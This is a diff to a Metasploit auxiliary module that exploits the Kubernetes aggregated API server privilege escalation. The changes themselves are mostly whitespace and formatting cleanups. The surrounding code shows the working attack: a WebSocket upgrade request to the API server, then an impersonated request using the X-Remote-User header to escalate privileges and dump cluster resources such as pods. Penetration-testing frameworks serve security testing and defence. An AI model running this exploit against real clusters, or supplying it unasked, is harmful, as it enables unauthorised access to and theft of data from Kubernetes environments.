@@ -7,25 +7,18 @@ require 'uri'
 require 'json'
 
 class MetasploitModule < Msf::Auxiliary
-  Rank = ExcellentRanking
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Kubernetes Aggregated API Server Privilege Escalation (unauthorised)',
       'Description'    => %q{
-      	  An API call to any aggregated API server endpoint can be escalated 
-	  to perform any API request against that aggregated API server, as 
-	  long as that aggregated API server is directly accessible from the 
-	  Kubernetes API server’s network. Default RBAC policy allows all 
-	  users (authenticated and unauthenticated) to perform discovery API 
-	  calls that allow this escalation against any aggregated API servers 
-	  configured in the cluster.
+    An API call to any aggregated API server endpoint can be escalated to perform any API request against that aggregated API server, as long as that aggregated API server is directly accessible from the Kubernetes API server’s network. Default RBAC policy allows all users (authenticated and unauthenticated) to perform discovery API calls that allow this escalation against any aggregated API servers configured in the cluster.
       },
       'Author'         =>
         [
-	  'Praveen Darshanam<praveend[dot]hac[at]gmail.com>', # metasploit module
-	  'Ariel Zelivansky', # metrics api poc
-	  'Vincent' # service catalog api poc
+          'Praveen Darshanam<praveend[dot]hac[at]gmail.com>', # metasploit module
+          'Ariel Zelivansky', # metrics api poc
+          'Vincent' # service catalog api poc
         ],
       'License'        => MSF_LICENSE,
       'References'     =>
@@ -35,10 +28,10 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://github.com/kubernetes/kubernetes/issues/71411' ],
           [ 'URL', 'https://blog.disects.com/2018/12/exploiting-kubernetes-privilege.html' ]
         ],
-      'Targets'		=> 
+      'Targets'		=>
         [
-	  ['Kubernetes', {} ]
-	],
+          ['Kubernetes', {} ]
+        ],
       'Platform'       => ['linux', 'win'],
       'Arch'           => ARCH_CMD,
       'Privileged'     => false,
@@ -48,10 +41,10 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443),
-	OptString.new('AGGREGATED_API', [ true, 'Aggregates API to use for Privilege Escalation', 'v1beta1.metrics.k8s.io' ]),
-	OptString.new('API_SERVER', [ true, 'Kubernetes cluster API Server HOST/FQDN/IP Address', nil ]),
-	OptString.new('API_RESOURCE_NAME', [ true, 'Kubernetes API Resource name (pods, nodes, servicebindings, seeds, shoots etc)', nil ]),
-	OptString.new('NAMESPACE', [ false, 'Kubernetes namespace to get api-resource details from', nil ]),
+        OptString.new('AGGREGATED_API', [ true, 'Aggregates API to use for Privilege Escalation', 'v1beta1.metrics.k8s.io' ]),
+        OptString.new('API_SERVER', [ true, 'Kubernetes cluster API Server HOST/FQDN/IP Address', nil ]),
+        OptString.new('API_RESOURCE_NAME', [ true, 'Kubernetes API Resource name (pods, nodes, servicebindings, seeds, shoots etc)', nil ]),
+        OptString.new('NAMESPACE', [ false, 'Kubernetes namespace to get api-resource details from', nil ]),
         OptString.new('X-Remote-User', [ true, 'Kubernetes User to escalate', nil ]),
         OptString.new('X-Remote-Group', [ false, 'Kubernetes Group', nil ])
       ])
@@ -77,11 +70,11 @@ class MetasploitModule < Msf::Auxiliary
       ws_req.add_field("Connection", "upgrade")
       print_status("Sending WebSocket request to API Server\n#{req_str}")
 
-      ws_resp = http.request ws_req 
+      ws_resp = http.request ws_req
       if ws_resp.code =~ /200/
         print_good("Found aggregated API Server \"#{datastore['AGGREGATED_API']}\" in the cluster")
         ws_data = JSON.parse(ws_resp.body)
-        print_status("Response\n#{JSON.pretty_generate(ws_data)}") 
+        print_status("Response\n#{JSON.pretty_generate(ws_data)}")
         http.finish
         return Exploit::CheckCode::Vulnerable
       else
@@ -118,14 +111,14 @@ class MetasploitModule < Msf::Auxiliary
       ws_req.add_field("Connection", "upgrade")
       print_status("Sending WebSocket request to API Server\n#{ws_req_str}")
 
-      ws_resp = http.request ws_req 
+      ws_resp = http.request ws_req
       if ws_resp.code =~ /200/
         print_good("Found aggregated API Server \"#{datastore['AGGREGATED_API']}\" in the cluster")
         ws_data = JSON.parse(ws_resp.body)
-        print_status(JSON.pretty_generate(ws_data)) 
+        print_status(JSON.pretty_generate(ws_data))
       else
         print_error("Aggregated API Server \"#{datastore['AGGREGATED_API']}\" not found")
-	http.finish
+        http.finish
         return
       end
       uri = URI(pod_req_str)
@@ -134,12 +127,12 @@ class MetasploitModule < Msf::Auxiliary
       pod_req.add_field("X-Remote-User", datastore['X-Remote-User'])
 
       print_status("Sending escalated API request to kubernetes Resource\n#{pod_req_str}")
-      pod_resp = http.request pod_req 
+      pod_resp = http.request pod_req
 
       if pod_resp.code =~ /200/
         print_good("Successfully escalated to user #{datastore['X-Remote-User']}")
         pod_data = JSON.parse(pod_resp.body)
-        print_status(JSON.pretty_generate(pod_data)) 
+        print_status(JSON.pretty_generate(pod_data))
       else
         print_error("Couldn't escalate to user #{datastore['X-Remote-User']}")
       end
@@ -147,7 +140,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def run 
+  def run
     host = datastore['API_SERVER']
     port = datastore['RPORT']
     api_ver = datastore['AGGREGATED_API'].split('.')[0]
